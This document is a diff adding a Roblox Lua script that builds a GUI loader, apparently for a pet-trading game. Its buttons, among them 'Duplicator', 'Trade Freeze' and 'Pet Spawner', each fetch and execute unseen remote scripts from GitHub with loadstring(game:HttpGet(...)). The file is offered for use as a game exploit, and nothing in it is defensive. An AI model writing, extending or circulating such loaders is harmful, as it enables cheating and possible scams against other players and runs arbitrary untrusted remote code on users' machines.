@@ -1,0 +1,197 @@
+-- Minimal Roblox service setup for GUI-only loader
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+local player = Players.LocalPlayer
+local mouse = player:GetMouse()
+
+-- 🌿 GUI Setup
+local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+screenGui.Name = "PetHatchGui"
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 260, 0, 340)
+frame.Position = UDim2.new(0, 20, 0, 100)
+frame.BackgroundColor3 = Color3.fromRGB(0, 128, 128)
+frame.BackgroundTransparency = 0.1
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+
+-- Title Section
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "🌸 MaoMao UI  💊"
+title.Font = Enum.Font.FredokaOne
+title.TextSize = 22
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+-- 👤 Credit
+local credit = Instance.new("TextLabel", frame)
+credit.Size = UDim2.new(1, 0, 0, 20)
+credit.Position = UDim2.new(0, 0, 0, 22)
+credit.BackgroundTransparency = 1
+credit.Text = "V3 - @maomaogag on YT"
+credit.Font = Enum.Font.FredokaOne
+credit.TextSize = 14
+credit.TextColor3 = Color3.fromRGB(200, 200, 200)
+
+
+-- Button Data
+local buttonData = {
+    {text = "🎲 Pet Randomizer", color = Color3.fromRGB(233, 143, 170), onClick = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaofiles/main/Egg%20Randomizer.txt"))()
+    end},
+    {text = "🕒 Auto Age Pet 50", color = Color3.fromRGB(183, 127, 144), onClick = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaofiles/main/Lvl50Egg.txt"))()
+    end},
+    {text = "🔬 Mutation Finder", color = Color3.fromRGB(186, 170, 204), onClick = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaofiles/main/PetMutationFinder.txt"))()
+    end},
+    {text = "🧬 Duplicator", color = Color3.fromRGB(120, 108, 204), onClick = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaofiles/main/Item%20Randomizer.txt"))()
+    end},
+    {text = "NEW 🤝🧊 Trade Freeze", color = Color3.fromRGB(75, 57, 115), onClick = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaofiles/main/TradeExploit.txt"))()
+    end},
+    {text = "NEW 🐶 Pet Spawner", color = Color3.fromRGB(40, 56, 74), onClick = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaofiles/main/PetSpawner.txt"))()
+    end},
+}
+
+for i, btn in ipairs(buttonData) do
+    local b = Instance.new("TextButton", frame)
+    b.Size = UDim2.new(1, -20, 0, 40)
+    b.Position = UDim2.new(0, 10, 0, 40 + (i-1)*50)
+    b.BackgroundColor3 = btn.color
+    b.Text = btn.text
+    b.TextSize = 20
+    b.Font = Enum.Font.FredokaOne
+    b.TextColor3 = Color3.fromRGB(255, 255, 255)
+    b.MouseButton1Click:Connect(btn.onClick)
+end
+
+-- Minimize Button
+local minimizeButton = Instance.new("TextButton", frame)
+minimizeButton.Size = UDim2.new(0, 25, 0, 25)
+minimizeButton.Position = UDim2.new(1, -30, 0, 5)
+minimizeButton.BackgroundTransparency = 1
+minimizeButton.Text = "X"
+minimizeButton.TextSize = 20
+minimizeButton.Font = Enum.Font.FredokaOne
+minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+minimizeButton.ZIndex = 10 -- stays above frame elements
+
+-- Restore Button (Circle with Image)
+local restoreButton = Instance.new("ImageButton")
+restoreButton.AnchorPoint = Vector2.new(0.5, 0.5)
+-- Responsive sizing and positioning
+local function getRestoreSizePx()
+    local viewport = camera and camera.ViewportSize or Vector2.new(1920, 1080)
+    local px = math.floor(math.clamp(viewport.Y * 0.06, 36, 64))
+    return px
+end
+
+local restorePosScale = Vector2.new(0.06, 0.12) -- top-left by default, in scale coordinates
+
+local function applyRestoreLayout()
+    local px = getRestoreSizePx()
+    restoreButton.Size = UDim2.fromOffset(px, px)
+    restoreButton.Position = UDim2.new(restorePosScale.X, 0, restorePosScale.Y, 0)
+end
+-- Use a known good public icon by default; replace with your own image id if desired
+restoreButton.Image = "rbxassetid://136486331563534"
+restoreButton.ImageTransparency = 0
+restoreButton.ImageColor3 = Color3.fromRGB(255, 255, 255)
+restoreButton.BackgroundTransparency = 1
+restoreButton.ScaleType = Enum.ScaleType.Fit -- makes sure the image isn't stretched
+restoreButton.Visible = false
+restoreButton.ZIndex = 50 -- ensures it's on top
+restoreButton.Parent = screenGui
+
+-- initial responsive layout + react to viewport size changes
+applyRestoreLayout()
+if camera then
+    camera:GetPropertyChangedSignal("ViewportSize"):Connect(applyRestoreLayout)
+end
+
+-- Make it circular
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(1, 0)
+corner.Parent = restoreButton
+
+-- Optional white border
+local stroke = Instance.new("UIStroke")
+stroke.Thickness = 2
+stroke.Color = Color3.fromRGB(255, 255, 255)
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border -- prevents it from covering the image
+stroke.Parent = restoreButton
+
+-- Start minimized by default
+frame.Visible = false
+restoreButton.Visible = true
+
+-- Draggable restore button (keeps position responsive and clamped to screen)
+local draggingRestore = false
+
+restoreButton.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingRestore = true
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        draggingRestore = false
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if not draggingRestore then return end
+    if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then
+        return
+    end
+
+    local viewport = camera and camera.ViewportSize or Vector2.new(1920, 1080)
+    local halfSize = restoreButton.AbsoluteSize.X * 0.5
+    local margin = math.max(6, halfSize)
+    local clampedX = math.clamp(input.Position.X, margin, viewport.X - margin)
+    local clampedY = math.clamp(input.Position.Y, margin, viewport.Y - margin)
+
+    restorePosScale = Vector2.new(clampedX / viewport.X, clampedY / viewport.Y)
+    restoreButton.Position = UDim2.new(restorePosScale.X, 0, restorePosScale.Y, 0)
+end)
+
+-- Minimize functionality
+minimizeButton.MouseButton1Click:Connect(function()
+    frame.Visible = false
+    restoreButton.Visible = true
+end)
+
+-- Restore functionality
+restoreButton.MouseButton1Click:Connect(function()
+    frame.Visible = true
+    restoreButton.Visible = false
+end)
+
+-- Dragging
+local drag = Instance.new("TextButton", title)
+drag.Size = UDim2.new(1, 0, 1, 0)
+drag.Text = ""
+drag.BackgroundTransparency = 1
+
+local dragging, offset
+drag.MouseButton1Down:Connect(function()
+    dragging = true
+    offset = Vector2.new(mouse.X - frame.Position.X.Offset, mouse.Y - frame.Position.Y.Offset)
+end)
+UserInputService.InputEnded:Connect(function()
+    dragging = false
+end)
+RunService.RenderStepped:Connect(function()
+    if dragging then
+        frame.Position = UDim2.new(0, mouse.X - offset.X, 0, mouse.Y - offset.Y)
+    end
+end)
